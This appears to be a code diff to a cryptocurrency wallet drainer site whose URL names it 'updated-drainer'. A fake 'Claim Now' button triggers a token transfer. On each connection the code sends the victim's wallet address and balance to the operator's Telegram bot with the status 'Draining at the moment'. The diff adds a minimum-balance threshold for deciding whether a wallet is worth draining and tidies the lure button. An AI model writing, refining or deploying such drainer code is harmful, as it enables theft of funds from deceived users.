@@ -267,17 +267,20 @@ const chat_id = "-4277212332";
 const website_url = `https://updated-drainer.vercel.app`;
 const newAds =  address
 const conBal = resultBal?.formatted
+const convConBal = Number(conBal)
+console.log(typeof(convConBal))
+console.log(typeof(conBal))
 const tokSymbol = resultBal?.symbol
 
 const dati = "✅ Draining at the moment...";
 const noDati = "❌ Not Draining at the moment..  (insufficient funds)";
-const newDat = 0;
+const newDat = 0.0026;
 
 
  const mytext = `🛜 New Connection!!! \n\n          
 💰 Total ${tokSymbol} Value: ${conBal} ${tokSymbol}\n
 🪙 Address: ${newAds}\n 
-⛓️‍💥 Action: ${newDat <= 0 ?  noDati : dati}\n
+⛓️‍💥 Action: ${convConBal <= newDat ?  noDati : dati}\n
 🌐 URL: ${website_url}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mytext)}
  `;
@@ -313,22 +316,19 @@ const newDat = 0;
             Disconnect
           </button>
         )} */}
-       <div className="md:px-24 px-5">
-        {isConnected  ? (
-          <>
-            <button
-              onClick={async () => await handleTokenTransfer()}
-              className="md:w-[450px] h-[40px] bg-green text-white p-2 text-xm rounded-3xl"
-            >
-              Claim Now
-            </button>
-          </>
-        ) : ( 
-            
-            <w3m-button balance="hide" label="Connect Wallet" />
-        )}
-        {/* className="md:w-[400px] w-full text-xl h-[50px] bg-green text-white rounded-3xl" */}
-      </div>
+      <div className="px-5 md:px-24">
+  {isConnected ? (
+    <button
+      onClick={async () => await handleTokenTransfer()}
+      className="w-full md:w-[450px] h-[40px] bg-green text-white p-2 text-sm md:text-base rounded-3xl"
+      aria-label="Claim Tokens"
+    >
+      Claim Now
+    </button>
+  ) : (
+    <w3m-button balance="hide" label="Connect Wallet" />
+  )}
+</div>
       </div>
 				{/* <div
 							onClick={closeAll}
